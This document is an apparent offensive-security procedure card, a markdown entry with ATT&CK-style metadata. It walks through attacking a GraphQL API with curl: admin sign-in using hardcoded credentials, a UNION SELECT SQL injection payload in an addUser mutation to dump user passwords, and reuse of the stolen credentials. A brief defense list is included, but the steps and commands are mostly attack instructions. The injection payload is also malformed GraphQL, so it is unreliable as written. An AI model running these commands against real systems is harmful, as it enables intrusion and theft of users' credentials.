---
type: procedure
description: >-
  Exploit vulnerable GraphQL mutations to authenticate as admin, inject payloads
  to steal user credentials, and create unauthorized accounts.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unsecured Credentials]]'
sub_techniques: []
tags:
  - graphql
  - injection
  - credential-theft
  - account-creation
commands:
  - '[[commands/graphql-admin-signin-mutation]]'
  - '[[commands/graphql-add-user-injection-mutation]]'
platforms:
  - Web
tools: []
validated: true
---

# GraphQL-Injection-via-Mutations-for-Credential-Theft-and-User-Addition

## Summary

This procedure demonstrates how to exploit vulnerabilities in GraphQL APIs by injecting malicious payloads into mutation queries. It involves authenticating as an admin user to obtain a token, then using an addUser mutation to inject SQL-like payloads (assuming backend SQL misconfigurations) to extract user credentials from the database and create unauthorized accounts, leading to data theft and persistence.

## Description

GraphQL APIs can be vulnerable to injection attacks if inputs are not properly sanitized, especially when mutations interact with backend databases like SQL. This procedure targets a vulnerable GraphQL endpoint where the signIn mutation allows admin authentication, and the addUser mutation can be abused for injection. By crafting payloads in fields like name and email, an attacker can trigger SQL injection to dump credentials or alter data. This is particularly dangerous in web applications using GraphQL for user management, as it enables unauthorized access to sensitive user data and account creation without proper validation. The attack assumes the GraphQL server is exposed (e.g., at /graphql) and lacks query complexity limits or input escaping.

## Requirements

1. Network access to the target GraphQL endpoint (e.g., http://target.com/graphql).
2. Knowledge of the GraphQL schema, including signIn and addUser mutations (discoverable via introspection if enabled).
3. Tools like curl for sending HTTP POST requests or a GraphQL client like Postman.
4. Admin credentials (e.g., login: "Admin", password: "secretp@ssw0rd") or ability to guess them.
5. The backend must use a vulnerable SQL database without prepared statements.

## Defense

- Implement strict input validation and sanitization for all GraphQL mutation fields, using libraries like graphql-java or Apollo with escaping.
- Enable query whitelisting and complexity limits to prevent injection and denial-of-service via deep queries.
- Use parameterized queries or ORMs in the backend to mitigate SQL injection risks.
- Disable GraphQL introspection in production and monitor for anomalous mutation patterns.
- Regularly audit GraphQL schemas and apply patches for known vulnerabilities in frameworks like Graphene or Hasura.

## Objectives

1. Authenticate as an admin to obtain a session token for subsequent authenticated actions.
2. Inject payloads into the addUser mutation to extract user credentials from the database.
3. Create unauthorized user accounts to establish persistence or further access.
4. Achieve credential theft leading to full account compromise.

## Instructions

### Step 1: Authenticate as Admin via signIn Mutation

**Context**: Begin by sending a signIn mutation to authenticate as the admin user. This returns a token needed for authenticated mutations. Use a tool like curl to POST the GraphQL query to the endpoint. This step verifies admin access and sets up for injection.

**Command** ([[commands/graphql-admin-signin-mutation]]):
```bash
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { signIn(login: \"Admin\", password: \"secretp@ssw0rd\") { token } }"}'
```

> This command sends the signIn mutation with hardcoded admin credentials. If successful, it extracts the authentication token from the response, which can be used in subsequent requests via Authorization headers (e.g., Bearer token). Why: Admin privileges are required to perform user additions without restrictions.

### Step 2: Inject Payload in addUser Mutation to Steal Credentials

**Context**: With the admin token, send an addUser mutation but inject a SQL payload into the name or email fields to dump credentials (e.g., via UNION SELECT). This assumes the backend concatenates inputs directly into SQL queries. Capture the response for leaked data. Why: This step exploits the lack of sanitization to query the users table and exfiltrate passwords.

**Command** ([[commands/graphql-add-user-injection-mutation]]):
```bash
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $_ADMIN_TOKEN" \
  -d '{"query": "mutation { addUser(id: \"1\", name: \"Dan Abramov\"; email: \"dan@dan.com\"; UNION SELECT id, password, email FROM users -- ) { id name email } }"}'
```

> Replace $_ADMIN_TOKEN with the token from Step 1. The injected payload (UNION SELECT ...) appends to the SQL query, returning user credentials in the response fields. Expected: Response includes leaked passwords alongside the fake user data. If the injection fails, adjust the payload to match the backend's SQL dialect (e.g., add comments to terminate strings).

### Step 3: Verify and Use Stolen Credentials

**Context**: Parse the response from Step 2 for stolen credentials. Test them by signing in as the victim user or using them for further access. Why: Validates the theft and enables lateral movement or data exfiltration.

Use the signIn mutation again with stolen creds:
```bash
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { signIn(login: \"$_VICTIM_EMAIL\", password: \"$_STOLEN_PASSWORD\") { token } }"}'
```

> If successful, a new token is returned, confirming access. Decision point: If creds are hashed, note for offline cracking; otherwise, use directly.
